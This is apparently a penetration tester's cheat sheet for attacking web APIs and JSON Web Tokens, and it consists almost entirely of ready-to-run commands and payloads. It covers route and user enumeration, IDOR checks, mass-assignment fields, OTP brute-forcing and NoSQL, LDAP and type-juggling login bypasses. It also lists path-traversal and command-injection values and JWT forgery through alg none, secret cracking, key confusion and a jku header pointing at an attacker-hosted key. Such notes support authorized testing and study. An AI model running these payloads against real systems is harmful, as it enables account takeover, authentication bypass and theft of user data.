# APIs and JWTs

## Documentation first
for p in swagger-ui.html swagger/index.html swagger.json openapi.json api-docs v2/api-docs v3/api-docs api/swagger.json graphql graphiql; do curl -sk -o /dev/null -w "%{http_code} /$p\n" "<Scheme>://<WebHost>/$p"; done
- [ ] Routes from the front end's JavaScript, and from Burp's history while I use every feature

## Routes and methods
ffuf -u <Scheme>://<WebHost>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404
ffuf -u <Scheme>://<WebHost>/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc all -fc 404
- [ ] /api/v1/, /api/v2/, /v1/ and /rest/ each searched as a root: an old version left running is a find
curl -sk -i -X OPTIONS <Scheme>://<WebHost>/api/v1/THE-ROUTE
for m in GET POST PUT PATCH DELETE; do curl -sk -o /dev/null -w "%{http_code} $m\n" -X $m <Scheme>://<WebHost>/api/v1/THE-ROUTE; done
- [ ] 405: the route is there and wants another method
- [ ] An error such as missing parameter: id names the parameters

## GraphQL
curl -sk -X POST <Scheme>://<WebHost>/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .

## Users
A login that answers one way for an unknown user and another for a wrong password:
ffuf -u <Scheme>://<WebHost>/api/v1/THE-ROUTE -X POST -H 'Content-Type: application/json' -d '{"email":"FUZZ","password":"x"}' -w emails.txt -fr 'not found'

## Other users' objects
Two accounts if I can make them, one with fewer rights. My own object first, then other IDs with my token:
seq 1 500 > ids.txt
ffuf -u <Scheme>://<WebHost>/api/v1/users/FUZZ -H 'Authorization: Bearer THE-TOKEN' -w ids.txt -mc 200
- [ ] Admin routes with a normal token, and /me swapped for /admin or for another user's ID
- [ ] Other methods on a route that refuses GET: PUT, PATCH, DELETE
- [ ] Fields in the JSON that the page never shows: emails, roles, hashes
- [ ] The same page as .json, ?format=json or Accept: application/json, for fields the HTML hides

## Fields I should not set
On sign-up or a profile update, with names seen in responses:
{"username": "THE-NAME", "password": "THE-PASSWORD", "isAdmin": true}
{"role": "admin"}
As a form post:
user[username]=THE-NAME&user[password]=THE-PASSWORD&user[admin]=1

## A limit only the new version keeps
An OTP or a reset code tried on the old version of the route:
seq -w 0000 9999 > otp.txt
ffuf -u <Scheme>://<WebHost>/api/v1/THE-ROUTE -X POST -H 'Content-Type: application/json' -d '{"email":"THE-EMAIL","otp":"FUZZ"}' -w otp.txt -ac

## Injection in JSON and logins
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": "^a"}}
{"search": "a'||'a'=='a"}
{"filename": "../../../../../../etc/passwd"}
{"target": "127.0.0.1;id"}
A form login sent as JSON instead, for PHP's loose ==:
{"username": "admin", "password": true}
{"username": "admin", "password": 0}
A MongoDB $where built from strings, then a login built as an LDAP filter:
admin' || 1==1%00
admin)(cn=*))%00
- [ ] * as both user and password, and the request with the password parameter deleted, not empty
- [ ] Resent as XML for XXE: :Pb xxe

## A JWT: read it
The payload, the middle part:
echo 'THE-JWT' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
At the pwn-broker prompt: tool install jwt-tool. It installs the jwt_tool command.
jwt_tool 'THE-JWT'

## A JWT: break it
- [ ] A changed claim with no new signature still works: nothing is checked
- [ ] Claims to change: sub, user, username, email, role, admin, isAdmin, and exp if it has run out
alg none, then a weak HMAC secret:
jwt_tool 'THE-JWT' -X a
echo 'THE-JWT' > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
Re-signed with that secret, changing claims as it asks:
jwt_tool 'THE-JWT' -T -S hs256 -p 'THE-SECRET'
RS256 to HS256, with the server's public key from /jwks.json or /.well-known/jwks.json as public.pem:
jwt_tool 'THE-JWT' -X k -pk public.pem
My own key embedded in the header, then a jku pointing at my server:
jwt_tool 'THE-JWT' -X i
In another terminal, the key jwt_tool signs with, served from Kali:
cp ~/.jwt_tool/jwttool_custom_jwks.json jwks.json && python3 -m http.server 80
jwt_tool 'THE-JWT' -X s -ju http://<LHOST>/jwks.json
- [ ] kid read as a file: kid set to ../../../../../../dev/null and signed with an empty key, in Burp's JWT Editor
